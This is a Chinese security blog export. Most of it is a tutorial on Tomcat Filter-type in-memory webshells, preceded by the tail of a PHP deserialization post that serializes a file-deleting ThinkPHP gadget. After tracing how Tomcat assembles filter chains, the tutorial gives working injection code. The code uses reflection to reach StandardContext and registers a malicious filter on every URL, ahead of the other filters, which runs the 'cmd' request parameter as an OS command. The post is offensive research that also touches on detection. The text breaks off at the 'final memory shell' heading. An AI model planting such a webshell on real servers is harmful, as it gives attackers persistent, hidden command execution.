<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;<span class="comment">//一定要加，这是一个大坑</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pipes</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> <span class="keyword">extends</span> <span class="title">Pipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [<span class="string">&quot;111.txt&quot;</span>];<span class="comment">//要删除的文件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure>

<h1 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h1><p>待更新。。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
        <tag>Write-up</tag>
        <tag>PHP Deserialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat内存马系列(一):Filter型</title>
    <url>/2021/12/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-%E4%B8%80-Filter%E5%9E%8B/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随着这些年来各种安全防护手段的出现，想要上传一个文件类型的<strong>webshell</strong>从而拿到权限更难上加难。但最近横空出世的内存马因为隐蔽性高，逐渐被大众所知。</p>
<p>内存马目前分为三大类：</p>
<p><strong>servlet-api类</strong></p>
<ul>
<li>Filter型</li>
<li>Servlet型</li>
<li>Listener型</li>
</ul>
<p><strong>spring类</strong></p>
<ul>
<li>拦截器</li>
<li>Controller型</li>
</ul>
<p><strong>Java Instrumentation类</strong></p>
<ul>
<li>Agent型</li>
</ul>
<p>此文将以servlet-api类的Filter类内存马开篇，详细讲解其原理、利用与检测。</p>
<span id="more"></span>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>新建一个JAVA项目</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145004004.png" alt="image-20211208145004004"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145023106.png" alt="image-20211208145023106"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145039178.png" alt="image-20211208145039178"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145106202.png" alt="image-20211208145106202"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145146347.png" alt="image-20211208145146347"></p>
<p>接下来就是哪里有IDEA提示就选哪里，比如下面这样的，我们直接按他的提示选fix</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145216611.png" alt="image-20211208145216611"></p>
<p>接下来在Project Structure里面把Tomcat的包引进来</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208145431939.png" alt="image-20211208145431939"></p>
<p>为了方便我全部引进来了</p>
<p>接下来在src文件夹里创建一个<strong>TestServlet</strong> Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doPost(req, resp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再创建一个<strong>TestFilter</strong> Class</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是初始化信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//执行过滤操作</span></span><br><span class="line"></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>WEB-INF/web.xml配置：需要配置Filter一些信息 - <strong>这个配置非常重要，理解它有助于我们的分析</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span> <span class="comment">&lt;!-- filter标签的内容将被存入FilterDef类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span><span class="comment">&lt;!-- filter标签的内容将被存入FilterMap类 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行一下看看：</p>
<p><a href="http://localhost:8080/testEnv_war_exploded/test">http://localhost:8080/testEnv_war_exploded/test</a></p>
<p>控制台出现信息，就这样Filter就设置成功了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208150319911.png" alt="image-20211208150319911"></p>
<h1 id="Tomcat-Filter流程"><a href="#Tomcat-Filter流程" class="headerlink" title="Tomcat Filter流程"></a>Tomcat Filter流程</h1><h2 id="web-xml的解析-amp-Context从何而来？"><a href="#web-xml的解析-amp-Context从何而来？" class="headerlink" title="web.xml的解析&amp;Context从何而来？"></a>web.xml的解析&amp;Context从何而来？</h2><p>web.xml中存放着filter相关的配置，它必然会被解析读取。web.xml文件里解析出来的内容由Tomcat中的<strong>WebXml类</strong>来存储。</p>
<p>在监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件后，<strong>WebXml</strong>将自身的存储的信息注入到Context中。</p>
<p>具体流程如下：</p>
<ul>
<li><strong>ContextConfig</strong>监听到<strong>Lifecycle.CONFIGURE_START_EVENT</strong>事件发生</li>
<li><strong>ContextConfig</strong>调用自身的<code>configureStart()</code>方法， 再调用<code>webConfig()</code>，将/web.xml解析保存到web.xml中，再调用<code>ContextConfig.configureContext(webxml)</code>将webxml中储存的信息注入到<strong>context</strong>中。</li>
</ul>
<p>来看代码：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208183932159.png" alt="image-20211208183932159">监听到事件后call到<strong>webConfig()<strong>方法，在webConfig中解析web.xml的内容、创建</strong>WebXml</strong>实例。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208184646650.png" alt="image-20211208184646650"></p>
<p>随后用<code>ConfigureContext.configureContext(webXml)</code>将<strong>webXml</strong>的信息传入当前<strong>context</strong>中。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208185001033.png" alt="image-20211208185001033"></p>
<p>这样一个<strong>context</strong>就配置好了。</p>
<h2 id="Filter是如何从context中被添加进filterChain的？"><a href="#Filter是如何从context中被添加进filterChain的？" class="headerlink" title="Filter是如何从context中被添加进filterChain的？"></a>Filter是如何从context中被添加进filterChain的？</h2><p><code>org.apache.catalina.core.StandardWrapperValve</code>的<code>invoke()</code>call到**createFilterChain()**，</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201730461.png" alt="image-20211208201730461">创建filterChain，</p>
<p>我们可以看到在<strong>createFilterChain()<strong>方法里，我们获取到了</strong>context</strong>，从而从这个<strong>context</strong>中获取到<strong>filterMaps</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208201919328.png" alt="image-20211208201919328"></p>
<p><strong>FilterMaps</strong>中存放的就是我们web.xml中写到的<code>&lt;filter-maping&gt;&lt;/filter-mapping&gt;</code></p>
<p>接着匹配当前访问的URL和filterMap中的URL是否一样(第一个if)，如果匹配，将从<strong>filterConfig</strong>中寻找该<strong>filterMap</strong>中对应的名字，如果找到了，就将该<strong>Filter</strong>的<strong>filterConfig</strong>添加进<strong>filterChain</strong>里。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208202205923.png" alt="image-20211208202205923"></p>
<p>我们继续跟踪到<strong>addFilter()<strong>，最后</strong>filterConfig</strong>会被放入<strong>filters</strong>数组当中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line">    ApplicationFilterConfig[] newFilters = <span class="built_in">this</span>.filters;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> newFilters.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filter</span> <span class="operator">=</span> newFilters[var4];</span><br><span class="line">        <span class="keyword">if</span> (filter == filterConfig) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.n == <span class="built_in">this</span>.filters.length) &#123;<span class="comment">//如果n等于当前filters数组的长度，那么就给filter数组扩容</span></span><br><span class="line">        newFilters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="built_in">this</span>.n + <span class="number">10</span>];</span><br><span class="line">        System.arraycopy(<span class="built_in">this</span>.filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, <span class="built_in">this</span>.n);</span><br><span class="line">        <span class="built_in">this</span>.filters = newFilters;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.filters[<span class="built_in">this</span>.n++] = filterConfig;<span class="comment">//将filter放入的filters数组的同时，将n+1，相当于是在计数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Filter的执行"><a href="#Filter的执行" class="headerlink" title="Filter的执行"></a>Filter的执行</h2><p>现在<strong>filters</strong>数组（也就是<strong>filterChain</strong>）已经被组装完毕了，它又该如何被执行呢？</p>
<p>现在继续回到<strong>StandardWrapperValve.invoke()</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220131316.png" alt="image-20211208220131316">很明显，filterChain中的filter被执行了 - <code>doFilter()</code></p>
<p>跟进去看看：<strong>ApplicationFilterChain.doFilter():<strong>调用了</strong>internalDoFilter</strong>()</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220257323.png" alt="image-20211208220257323"></p>
<p>继续跟：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211208220517246.png" alt="image-20211208220517246"></p>
<p>然后调用到了我们写在TestFilter.java里面的<code>doFilter()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="comment">//执行过滤操作</span></span><br><span class="line"></span><br><span class="line">    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>至此，我们整个filter的执行就到此结束。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们来总结一下涉及到的一些Class，这里都以英文字面意思来理解比较容易。</p>
<p>Filter的配置是由我们手动写在<strong>web.xml</strong>文件里的，所以需要把配置取出来，封装进这个web程序的context里面，以便其它地方调用。</p>
<ul>
<li><p>ContextConfig - 专门<strong>配置</strong>Context(可以理解为存储当前web程序信息)的类。</p>
<ul>
<li>ContextConfig类负责监听<strong>Lifecycle.CONFIGURE_START_EVENT</strong>，也就是“配置开始”事件，监听到就会开始配置 - **configureStart()**。</li>
<li>ConfigureStart()中会call到webConfig()<strong>方法 - <strong>webConfig</strong>需要先从</strong>web.xml中把内容取出来，先创建一个WebXml类的instance.</li>
<li>用configureContext(webXml)把webXml的内容都存入当前的context。</li>
</ul>
</li>
<li><p>StandardWrapperValve - 一个 Wrapper 的标准实现类，一个 Wrapper 代表一个Servlet</p>
<ul>
<li><p>把这个StandardWrapperValve简单理解为一个servlet，这个servlet接收到了数据，就要对数据进行过滤，要过滤就要先获取过滤规则，也就是我们的过滤器Filters</p>
</li>
<li><p>它利用ApplicationFilterFactory.createFilterChain()来创建一个FilterChain = 》 里面是所有匹配到的filterConfig的集合 </p>
<ul>
<li>createFilterChain()读取了当前context，并从获取到的context中读取到了<strong>filterMaps</strong> =》 里面是所有filter的mapping的情况（<strong>见环境搭建中的web.xml文件）</strong>，如果当前访问的URL匹配上了filter mapping，且在<strong>filterConfig</strong>中有其filter-name有对应的filter-class被配置，那么就将这个<strong>filterConfig</strong>添加进filterChain里面，以供使用。至此，filterChain组装完毕。</li>
</ul>
</li>
<li><p>filterChain有了，接下来就是依次去触发filter了。StandardWrapperValve执行filterChain.doFilter()开始执行chain里面的filter。</p>
<ul>
<li>从chain里面获取filterConfig，再从filterConfig中获取到filter</li>
</ul>
</li>
<li><p>最后执行filter.doFilter()</p>
</li>
</ul>
</li>
</ul>
<p><strong>可以看出来，一个filter被执行的条件</strong>：</p>
<ul>
<li>在context#filterMaps中，有和当前访问URL相匹配的<strong>url-pattern</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>    <span class="comment">&lt;!--url要匹配--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>filterConfig中需要有这个filter名字对应的class</p>
<p>filterConfig中不仅存放了<strong>filterDef</strong>，还存放了当时的context。filterDef对应xml中如下内容：</p>
</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>testFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>TestFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>   <span class="comment">&lt;!--class要匹配上filter name--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>假设我们要自己构造一个这样的符合条件的filter应该怎么做呢？</p>
<h1 id="Filter内存马的运用"><a href="#Filter内存马的运用" class="headerlink" title="Filter内存马的运用"></a>Filter内存马的运用</h1><h2 id="构造内存马思路"><a href="#构造内存马思路" class="headerlink" title="构造内存马思路"></a>构造内存马思路</h2><ul>
<li>构造一个含恶意代码的filter</li>
<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
</ul>
<blockquote>
<p>要注意的是，因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</p>
<p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。</p>
</blockquote>
<h2 id="开始构造内存马"><a href="#开始构造内存马" class="headerlink" title="开始构造内存马"></a>开始构造内存马</h2><h3 id="获取context"><a href="#获取context" class="headerlink" title="获取context"></a>获取context</h3><p>前面说到，FilterMaps是放在context的，所以需要先得到context.</p>
<p>当我们访问一个jsp文件的时候，该jsp文件能够接收到request,所以我们可以获取到该request的servletContext</p>
<p>观察一下servletContext的内容：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209102528669.png" alt="image-20211209102528669"></p>
<p>我们发现实际上内容都是在<strong>StandardContext</strong>里面的 - servletContext的context是ApplicationContext类，ApplicationContext是StandardContext类。</p>
<p><strong>可以一层一层获取</strong>：最终获取到StandardContext</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();<span class="comment">//获取servletContext</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取servletContext.context</span></span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);<span class="comment">//得到applicationContext</span></span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);<span class="comment">//获取applicationContext.context</span></span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);<span class="comment">//得到standardContext</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>其它的context获取方法：</strong></p>
<p>从线程中获取StandardContext 如果没有request对象的话可以从当前线程中获取 <a href="https://zhuanlan.zhihu.com/p/114625962">https://zhuanlan.zhihu.com/p/114625962</a></p>
<p>从MBean中获取 <a href="https://scriptboy.cn/p/tomcat-filter-inject/">https://scriptboy.cn/p/tomcat-filter-inject/</a></p>
</blockquote>
<h3 id="修改context-amp-创建恶意Filter"><a href="#修改context-amp-创建恶意Filter" class="headerlink" title="修改context&amp;创建恶意Filter"></a>修改context&amp;创建恶意Filter</h3><p><strong>StandardContext</strong>中可以看到：其包含了我们需要用到的filterConfigs, filterDefs, filterMaps</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211209103331546.png" alt="image-20211209103331546"></p>
<p>按照之前的思路：</p>
<blockquote>
<ul>
<li>构造一个含恶意代码的filter</li>
<li>用filterDef将filter进行封装(filter-name,filter-class)</li>
<li>将构造的filterDef添加到filterDefs和filterConfigs中</li>
<li>创建一个新的filterMap将URL和filter进行绑定，并添加到filterMaps中</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;leihehe&quot;</span>;<span class="comment">//先设置这个恶意filter的名字</span></span><br><span class="line"><span class="comment">/*获取filterConfigs*/</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);<span class="comment">//获取到filterConfigs =&gt; 一堆filterConfig的集合</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>)&#123;<span class="comment">//判断我们自己设定filter名字的filterConfig是否不存在</span></span><br><span class="line">    		<span class="comment">/* 不存在，开始创建恶意 Filter */</span></span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这段代码是shell恶意代码，就不详细解释了</span></span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).start();<span class="comment">//windows环境下测试</span></span><br><span class="line">                    <span class="comment">//Process process = new ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,req.getParameter(&quot;cmd&quot;)).start();</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> process.getInputStream().read(bytes);</span><br><span class="line">                    servletResponse.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bytes,<span class="number">0</span>,len));</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个FilterDef 然后设置我们filterDef的名字，和类名，以及类</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 创建一个filtermap</span></span><br><span class="line"><span class="comment">         * 设置filter的名字和对应的urlpattern</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());<span class="comment">// 这里用到的 javax.servlet.DispatcherType类是servlet 3 以后引入，而 Tomcat 7以上才支持 Servlet 3</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将filtermap 添加到 filterMaps 中的第一个位置</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 利用反射创建 FilterConfig，并且将 filterDef 和 standardCtx（即 Context）作为参数进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 将 name 和 filterConfig 作为 key-value进行传入</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        filterConfigs.put(name,filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;Inject Success !&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="最终内存马"><a href="#最终内存马" class="headerlink" title="最终内存马"></a>最终内存马</h3><p><strong>leihehe.jsp</strong></p>
